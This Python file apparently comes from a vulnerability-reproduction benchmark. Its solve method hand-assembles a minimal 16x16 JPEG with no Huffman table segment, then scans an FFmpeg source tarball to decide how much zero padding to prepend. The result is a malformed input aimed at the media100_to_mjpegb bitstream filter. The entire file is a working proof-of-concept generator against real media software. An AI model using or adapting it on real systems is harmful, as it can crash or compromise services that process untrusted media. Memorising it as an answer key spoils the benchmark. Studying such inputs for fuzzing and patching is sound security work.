import io
import os
import re
import tarfile
from typing import Optional, Tuple


def _u16be(x: int) -> bytes:
    return bytes([(x >> 8) & 0xFF, x & 0xFF])


def _jpeg_no_dht_420_16x16() -> bytes:
    soi = b"\xFF\xD8"

    app0_data = b"JFIF\x00" + b"\x01\x01" + b"\x00" + b"\x00\x01" + b"\x00\x01" + b"\x00" + b"\x00"
    app0 = b"\xFF\xE0" + _u16be(2 + len(app0_data)) + app0_data

    qlum = bytes([
        16, 11, 10, 16, 24, 40, 51, 61,
        12, 12, 14, 19, 26, 58, 60, 55,
        14, 13, 16, 24, 40, 57, 69, 56,
        14, 17, 22, 29, 51, 87, 80, 62,
        18, 22, 37, 56, 68, 109, 103, 77,
        24, 35, 55, 64, 81, 104, 113, 92,
        49, 64, 78, 87, 103, 121, 120, 101,
        72, 92, 95, 98, 112, 100, 103, 99
    ])
    qchr = bytes([
        17, 18, 24, 47, 99, 99, 99, 99,
        18, 21, 26, 66, 99, 99, 99, 99,
        24, 26, 56, 99, 99, 99, 99, 99,
        47, 66, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99
    ])
    dqt_data = b"\x00" + qlum + b"\x01" + qchr
    dqt = b"\xFF\xDB" + _u16be(2 + len(dqt_data)) + dqt_data

    sof_data = b"\x08" + _u16be(16) + _u16be(16) + b"\x03" + b"\x01\x22\x00" + b"\x02\x11\x01" + b"\x03\x11\x01"
    sof0 = b"\xFF\xC0" + _u16be(2 + len(sof_data)) + sof_data

    sos_data = b"\x03" + b"\x01\x00" + b"\x02\x11" + b"\x03\x11" + b"\x00\x3F\x00"
    sos = b"\xFF\xDA" + _u16be(2 + len(sos_data)) + sos_data

    # 1 MCU for 16x16 with 4:2:0 => 6 blocks. All-zero coefficients:
    # Y blocks: DC(0)=00, EOB=1010 => 6 bits each; 4 Y blocks => 24 bits
    # Cb/Cr blocks: DC(0)=00, EOB(chroma)=00 => 4 bits each; 2 chroma blocks => 8 bits
    # Total 32 bits => 4 bytes: 0x28 0xA2 0x8A 0x00
    entropy = b"\x28\xA2\x8A\x00"

    eoi = b"\xFF\xD9"

    return soi + app0 + dqt + sof0 + sos + entropy + eoi


def _read_tar_member_text(tar: tarfile.TarFile, member: tarfile.TarInfo, limit: int = 500_000) -> str:
    try:
        f = tar.extractfile(member)
        if f is None:
            return ""
        data = f.read(limit)
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("latin-1", errors="ignore")
    except Exception:
        return ""


def _find_media100_bsf_source(tar: tarfile.TarFile) -> Optional[Tuple[str, str]]:
    cand = []
    for m in tar.getmembers():
        if not m.isfile():
            continue
        name = m.name
        low = name.lower()
        if low.endswith("media100_to_mjpegb.c") or low.endswith("media100_to_mjpegb_bsf.c"):
            text = _read_tar_member_text(tar, m, limit=2_000_000)
            return (name, text)
        if "media100_to_mjpegb" in low and low.endswith((".c", ".h")) and "bsf" in low:
            cand.append(m)
    for m in cand:
        text = _read_tar_member_text(tar, m, limit=2_000_000)
        if "media100_to_mjpegb" in text:
            return (m.name, text)
    return None


def _infer_jpeg_offset_from_bsf_source(src_text: str) -> Optional[int]:
    # Heuristic: look for explicit SOI checks at offset.
    # Match patterns like: AV_RB16(buf + 4) == 0xffd8, or buf[4] == 0xff && buf[5] == 0xd8
    min_off = None
    for line in src_text.splitlines():
        l = line.strip()
        if not l or "d8" not in l.lower():
            continue
        ll = l.lower()
        if "ffd8" not in ll and "0xd8" not in ll:
            continue

        m = re.search(r"av_r[b|l]16\s*\(\s*([^)]+)\s*\)\s*==\s*0x[fF]{2}[dD]8", l)
        if m:
            expr = m.group(1)
            mo = re.search(r"\+\s*(\d+)", expr)
            off = int(mo.group(1)) if mo else 0
            if min_off is None or off < min_off:
                min_off = off
            continue

        m2 = re.search(r"\[\s*(\d+)\s*\]\s*==\s*0x[fF]{2}\b", l)
        m3 = re.search(r"\[\s*(\d+)\s*\]\s*==\s*0x[dD]8\b", l)
        if m2 and m3:
            o1 = int(m2.group(1))
            o2 = int(m3.group(1))
            off = min(o1, o2)
            if min_off is None or off < min_off:
                min_off = off
            continue

        m4 = re.search(r"\[\s*(\d+)\s*\]\s*==\s*0x[dD]8\b", l)
        if m4 and ("0xff" in ll or "== 0xff" in ll):
            off = int(m4.group(1)) - 1
            if off < 0:
                off = 0
            if min_off is None or off < min_off:
                min_off = off

    if min_off is None:
        return None
    if min_off < 0 or min_off > 64:
        return None
    return min_off


class Solution:
    def solve(self, src_path: str) -> bytes:
        jpeg = _jpeg_no_dht_420_16x16()

        jpeg_offset = None
        try:
            if src_path and os.path.exists(src_path):
                with tarfile.open(src_path, "r:*") as tar:
                    found = _find_media100_bsf_source(tar)
                    if found is not None:
                        _, txt = found
                        jpeg_offset = _infer_jpeg_offset_from_bsf_source(txt)
        except Exception:
            jpeg_offset = None

        if jpeg_offset is None or jpeg_offset == 0:
            return jpeg

        return (b"\x00" * jpeg_offset) + jpeg